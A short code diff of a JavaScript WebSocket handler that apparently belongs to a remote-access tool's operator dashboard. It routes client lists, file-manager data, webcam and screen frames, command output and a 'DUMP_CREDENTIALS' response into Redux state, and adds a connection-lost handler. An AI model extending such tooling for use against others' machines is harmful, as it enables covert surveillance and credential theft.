@@ -1,4 +1,4 @@
-import {addSingleClientToTable, selectClientByUUID, setClients} from "@redux/slices/clientSlice";
+import { disconnectClient, selectClientByUUID, setClients} from "@redux/slices/clientSlice";
 import {setDirectoryData, setDisks, updateProgressBar} from "@redux/slices/fileManagerSlice";
 import {setWebcamDevices, setWebcamFrame} from "@redux/slices/webcamManagerSlice";
 import {setOriginalDimensions, setScreenFrame, setScreens} from "@redux/slices/screenManagerSlice";
@@ -13,7 +13,7 @@ export const handleWebSocketMessage = (store, data) => {
     } else if (data.RESPONSE === "CLIENT_SET"){
         store.dispatch(selectClientByUUID(data));
     } else if (data.RESPONSE === "SYS_NET_INFO"){
-        store.dispatch(addSingleClientToTable(data));
+        store.dispatch(setClients([data]));
     } else if (data.RESPONSE === "DISKS") {
         store.dispatch(setDisks(data.disks));
         if (data.firstDiskDirectory) {
@@ -33,6 +33,8 @@ export const handleWebSocketMessage = (store, data) => {
         store.dispatch(setCommandResponse(data));
     } else if (data.RESPONSE ===  "DUMP_CREDENTIALS"){
         store.dispatch(setCredentials(data));
+    } else if (data.RESPONSE === "CPP_CLIENT_CONNECTION_LOST"){
+        store.dispatch(disconnectClient(data));
     }
 };
 
